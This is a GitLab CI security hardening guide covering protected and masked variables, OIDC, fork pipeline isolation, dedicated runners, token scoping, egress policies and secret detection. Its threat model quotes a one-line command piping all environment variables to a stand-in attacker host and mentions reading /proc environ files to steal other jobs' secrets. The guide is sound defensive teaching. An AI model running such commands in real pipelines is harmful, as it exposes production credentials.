---
title: "GitLab CI Security: Protected Variables, Runner Isolation, and Pipeline Hardening"
description: "GitLab CI pipelines have access to deployment credentials, cloud provider tokens, and production secrets. Unprotected variables, shared runners with broad permissions, and unrestricted pipeline triggers expose these secrets to any developer with repository access."
slug: "gitlab-ci-security"
date: 2026-05-01
lastmod: 2026-05-01
category: "cicd"
tags: ["gitlab", "cicd", "pipeline-security", "runners", "variables", "protected-branches"]
personas: ["platform-engineer", "security-engineer", "sre"]
article_number: 298
difficulty: "intermediate"
estimated_reading_time: 13
published: true
layout: article.njk
permalink: "/articles/cicd/gitlab-ci-security/index.html"
---

# GitLab CI Security: Protected Variables, Runner Isolation, and Pipeline Hardening

## Problem

GitLab CI is one of the most widely deployed CI/CD platforms in self-managed environments. Pipeline jobs have access to environment variables containing deployment credentials, cloud tokens, and production secrets. Every `.gitlab-ci.yml` commit is a potential attack vector: a developer (or an attacker with developer access) can modify the pipeline to exfiltrate secrets.

Common security failures:

- **Unprotected CI/CD variables.** GitLab variables can be marked "Protected" — visible only to pipelines running on protected branches — or left unprotected, visible to all branches and merge request pipelines. Production secrets stored as unprotected variables are accessible to any developer who can create a branch and run a pipeline.
- **Shared runners with excessive permissions.** GitLab.com shared runners and self-managed group runners run jobs from all projects. A malicious pipeline on one project can attempt to pivot to other projects' secrets by exploiting runner metadata or shared filesystem state.
- **`CI_JOB_TOKEN` scope too broad.** GitLab's `CI_JOB_TOKEN` authenticates inter-project API calls during CI. Without explicit scope restrictions, any pipeline job can authenticate as the project to access packages, container registries, and API endpoints of other projects in the group.
- **Merge request pipelines run attacker code.** Pipelines triggered by external merge requests (from forked repositories) run `.gitlab-ci.yml` from the fork. Without protection, these pipelines have access to protected variables and runners.
- **DAST/deployment jobs run on unreviewed code.** Dynamic testing or deployment jobs run automatically against production targets on every commit, including commits from untrusted branches.
- **No pipeline egress control.** Jobs can make outbound network calls to arbitrary hosts — exfiltrating secrets to attacker-controlled infrastructure. Without egress controls, a malicious job script can POST all environment variables to an external endpoint.

**Target systems:** GitLab 16.x+ (self-managed and GitLab.com); GitLab Runner 16.x+ (Docker, Kubernetes, shell executors); GitLab CI/CD Variables (protected, masked); GitLab OIDC for cloud provider authentication.

## Threat Model

- **Adversary 1 — Unprotected variable extraction:** A developer creates a feature branch and modifies `.gitlab-ci.yml` to run `env | curl -X POST attacker.com --data-binary @-`. All unprotected CI/CD variables — including production secrets — are exfiltrated.
- **Adversary 2 — Fork-based pipeline credential theft:** An external contributor forks the project and opens a merge request. The merged pipeline (if auto-run) executes on GitLab.com shared runners with access to the target project's protected variables.
- **Adversary 3 — Runner pivot between projects:** A compromised job on a shared runner reads `/proc/*/environ` or Docker socket metadata to discover environment variables from concurrently running jobs from other projects on the same runner.
- **Adversary 4 — `CI_JOB_TOKEN` abuse:** A pipeline uses `CI_JOB_TOKEN` to authenticate API calls. An attacker who can run a pipeline uses the token to access other projects' packages, registries, or APIs beyond the intended scope.
- **Adversary 5 — Deployment job triggered from unreviewed branch:** Auto-deploy runs on every push to a development branch. An attacker with developer role pushes a commit that modifies the deploy script to run malicious code in the production environment.
- **Access level:** Adversaries 1 and 5 need developer role. Adversary 2 needs the ability to fork. Adversary 3 exploits shared runner isolation. Adversary 4 needs pipeline execution access.
- **Objective:** Extract production credentials; run code in production environment; gain persistent access.
- **Blast radius:** Unprotected production secrets in CI give any developer access to production infrastructure equivalent to the CD pipeline's permissions.

## Configuration

### Step 1: Protect All Production Variables

```yaml
# GitLab UI / API: mark all production secrets as Protected AND Masked.
# Protected: only visible to pipelines on protected branches/tags.
# Masked: value redacted from job logs.

# Via GitLab API:
curl --request POST \
  --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  --header "Content-Type: application/json" \
  --data '{
    "key": "AWS_ACCESS_KEY_ID",
    "value": "AKIA...",
    "protected": true,
    "masked": true,
    "environment_scope": "production"
  }' \
  "https://gitlab.example.com/api/v4/projects/$PROJECT_ID/variables"
```

Variable protection matrix:

| Variable type | Protected | Masked | Environment scope |
|---------------|-----------|--------|-------------------|
| Production cloud credentials | Yes | Yes | `production` |
| Staging credentials | Yes | Yes | `staging` |
| Development API keys | No | Yes | `*` |
| Public configuration | No | No | `*` |

Replace long-lived credentials with short-lived OIDC tokens:

```yaml
# .gitlab-ci.yml — use OIDC for cloud auth (no static credentials needed).
deploy:production:
  stage: deploy
  environment: production
  id_tokens:
    AWS_OIDC_TOKEN:
      aud: https://gitlab.example.com
  script:
    - |
      # Exchange GitLab OIDC token for AWS credentials.
      export $(aws sts assume-role-with-web-identity \
        --role-arn "$AWS_ROLE_ARN" \
        --role-session-name "gitlab-ci-$CI_JOB_ID" \
        --web-identity-token "$AWS_OIDC_TOKEN" \
        --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
        --output text | awk '{print "AWS_ACCESS_KEY_ID="$1,"AWS_SECRET_ACCESS_KEY="$2,"AWS_SESSION_TOKEN="$3}')
    - ./deploy.sh
  rules:
    - if: $CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"
```

### Step 2: Protected Branches and Deployment Rules

```yaml
# .gitlab-ci.yml — restrict deployment jobs to protected branches only.

stages:
  - test
  - build
  - deploy

# Test runs on all branches.
test:
  stage: test
  script: make test

# Build runs on all branches (produces artefact; no secrets needed).
build:
  stage: build
  script: make build

# Deploy to staging: only on `develop` (protected branch).
deploy:staging:
  stage: deploy
  environment: staging
  script: ./deploy.sh staging
  rules:
    - if: $CI_COMMIT_BRANCH == "develop"
      when: manual   # Require manual trigger even on protected branch.
    - when: never

# Deploy to production: only on `main` (protected branch), manual.
deploy:production:
  stage: deploy
  environment: production
  script: ./deploy.sh production
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual
    - when: never
```

GitLab branch protection (set in repository settings):

```
Settings → Repository → Protected Branches:
  Branch: main
    Allowed to merge: Maintainers
    Allowed to push and merge: No one  (force push disabled)
    Require approval from code owners: Yes
    
  Branch: develop
    Allowed to merge: Developers + Maintainers
    Allowed to push and merge: Developers + Maintainers
```

### Step 3: Fork Pipeline Isolation

Prevent fork pipelines from accessing protected variables:

```
GitLab UI: Settings → CI/CD → General pipelines:
  ☑ Limit access to protected variables for pipelines from forked projects: ON
  
  "Fork pipeline" trigger: Block pipelines from forks from running with protected variables
```

```yaml
# .gitlab-ci.yml — add explicit rules to block fork pipelines from sensitive jobs.
deploy:production:
  rules:
    # Only run on pipelines from the same project (not forks).
    - if: $CI_PROJECT_NAMESPACE == "my-company" && $CI_COMMIT_BRANCH == "main"
      when: manual
    - when: never

# Check for fork pipeline in any job.
check-not-fork:
  script:
    - |
      if [ "$CI_PROJECT_ROOT_NAMESPACE" != "$CI_PROJECT_NAMESPACE" ]; then
        echo "Fork pipeline detected; aborting"
        exit 1
      fi
```

### Step 4: Dedicated Runners per Environment

Never share runners between production deployment jobs and general development:

```yaml
# Register a dedicated production runner with a specific tag.
gitlab-runner register \
  --url "https://gitlab.example.com" \
  --token "RUNNER_TOKEN" \
  --executor docker \
  --docker-image "alpine:3.19" \
  --tag-list "production-deploy" \
  --locked   # Lock to specific project; not shared.

# In .gitlab-ci.yml — require the production runner tag.
deploy:production:
  tags:
    - production-deploy   # Only runs on the dedicated runner.
  environment: production
  script: ./deploy.sh production
```

Runner configuration hardening:

```toml
# /etc/gitlab-runner/config.toml — production runner.
[[runners]]
  name = "production-deploy"
  url = "https://gitlab.example.com"
  token = "RUNNER_TOKEN"
  executor = "docker"
  limit = 1   # One concurrent job; prevents cross-job interference.
  
  [runners.docker]
    image = "alpine:3.19"
    privileged = false     # Never privileged.
    disable_cache = true   # No shared cache between jobs.
    # No bind mounts to host filesystem.
    volumes = ["/cache"]   # Cache volume only; not host paths.
    pull_policy = ["always"]  # Always pull; prevent stale image attacks.
    
  [runners.feature_flags]
    network_per_build = true  # Isolate each build's network namespace.
```

### Step 5: `CI_JOB_TOKEN` Scope Restriction

```
GitLab UI: Settings → CI/CD → Token Access:
  Limit CI_JOB_TOKEN access:
    ☑ Only allow access to THIS project
    
    Allow CI job tokens from the following projects to access this project:
    (Add only explicitly approved projects)
```

```yaml
# Use CI_JOB_TOKEN only for intended operations.
# Restrict what the token can access in .gitlab-ci.yml.

build:
  script:
    # Pull a dependency from the same GitLab instance.
    - |
      docker login -u gitlab-ci-token -p $CI_JOB_TOKEN registry.gitlab.example.com
      docker pull registry.gitlab.example.com/my-group/base-image:latest
    # Do NOT use CI_JOB_TOKEN to authenticate against external services.
    # Do NOT log the token value.
```

### Step 6: Pipeline Egress Control

Restrict outbound network access from runner containers:

```yaml
# kubernetes executor: NetworkPolicy restricting runner pod egress.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: gitlab-runner-egress
  namespace: gitlab-runners
spec:
  podSelector:
    matchLabels:
      app: gitlab-runner-job
  policyTypes:
    - Egress
  egress:
    # Allow GitLab server (for job reporting).
    - to:
        - ipBlock:
            cidr: 192.0.2.10/32   # GitLab server IP.
      ports:
        - port: 443
    # Allow internal artefact registry.
    - to:
        - ipBlock:
            cidr: 10.0.0.0/8
      ports:
        - port: 443
        - port: 5000
    # Allow DNS.
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 53
          protocol: UDP
    # Block all other egress — prevents secret exfiltration to external hosts.
```

### Step 7: Secret Detection in Pipeline Logs

```yaml
# Add a secrets detection job to every pipeline.
include:
  - template: Security/Secret-Detection.gitlab-ci.yml

secret_detection:
  stage: test
  variables:
    SECRET_DETECTION_HISTORIC_SCAN: "false"   # Only scan new commits.
```

```yaml
# Custom job to scan for common secret patterns in job logs.
scan-job-logs:
  stage: .post
  script:
    - |
      # Scan the most recent job's log for credential patterns.
      curl -s --header "PRIVATE-TOKEN: $SCAN_TOKEN" \
        "$CI_API_V4_URL/projects/$CI_PROJECT_ID/jobs/$CI_JOB_ID/trace" | \
        grep -E 'AKIA[0-9A-Z]{16}|password\s*[:=]\s*\S+|token\s*[:=]\s*\S+' && \
        echo "WARNING: Possible credential in job log" || true
  allow_failure: true
```

### Step 8: Telemetry

```
gitlab_ci_pipeline_duration_seconds{project, ref, status}      histogram
gitlab_ci_job_duration_seconds{project, job, runner_tag}        histogram
gitlab_ci_job_failures_total{project, job, failure_reason}      counter
gitlab_runner_jobs_total{runner, state}                         counter
gitlab_ci_protected_variable_access_total{project, variable}    counter
gitlab_ci_fork_pipeline_blocked_total{project}                  counter
```

Alert on:

- Any deployment job running on an unprotected branch — indicates rules misconfiguration.
- Fork pipeline attempting to access protected variables — alert and investigate.
- `CI_JOB_TOKEN` used to access a project outside the allowed scope — token scope misconfiguration.
- Job log scan detects credential pattern — immediate investigation.
- Runner job duration spike — a pipeline job running significantly longer than baseline may be exfiltrating data.

## Expected Behaviour

| Signal | Default GitLab CI | Hardened GitLab CI |
|--------|------------------|-------------------|
| Developer branch accesses production secret | Unprotected variable visible to all | Protected variable restricted to `main` branch |
| Fork pipeline runs deployment | Runs with project's protected variables | Fork pipeline blocked from protected variables |
| Shared runner used for production deploy | Any project on same runner may interfere | Dedicated tagged runner; locked to project |
| `CI_JOB_TOKEN` cross-project access | Broad access to group resources | Scoped to specific approved projects |
| Outbound exfiltration in job | No restriction | NetworkPolicy blocks non-approved destinations |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|--------|---------|------|------------|
| OIDC over static credentials | No long-lived secrets in variables | Requires cloud provider OIDC configuration | One-time setup; Terraform module for AWS/GCP OIDC trust |
| Dedicated production runners | No cross-project runner interference | Additional runner infrastructure | One runner instance per environment; share within environment |
| Fork pipeline isolation | Prevents credential theft via fork MR | External contributors cannot run pipelines with secrets | Require maintainer to trigger pipeline manually for fork MRs |
| Network egress restriction | Prevents secret exfiltration | Builds cannot reach arbitrary external services | Allowlist required package registries; use artifact caching |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---------|---------|-----------|----------|
| Protected variable not propagated | Deployment job fails with missing env var | Job log shows undefined variable error | Check variable is protected AND environment scope matches |
| Runner tag missing | Deployment job queues indefinitely | Job stuck in "pending" state | Add `production-deploy` tag to runner or fix job tag |
| OIDC token exchange fails | Deployment fails with auth error | Job log shows STS error | Check IAM role trust policy includes GitLab OIDC issuer |
| Fork pipeline blocked legitimately | External contributor cannot test pipeline | Pipeline not triggered | Maintainer manually triggers pipeline after code review |
| Network policy too restrictive | Build fails on package install | Job fails with connection refused | Add package registry IP to egress allowlist |

## Related Articles

- [Securing GitHub Actions](/articles/cicd/securing-github-actions/)
- [Argo CD Security Hardening](/articles/cicd/argocd-security-hardening/)
- [Jenkins Security Hardening](/articles/cicd/jenkins-security-hardening/)
- [OIDC Federation Hardening for CI-to-Cloud](/articles/cicd/oidc-federation-hardening/)
- [CI/CD Secret Management](/articles/cicd/cicd-secret-management/)
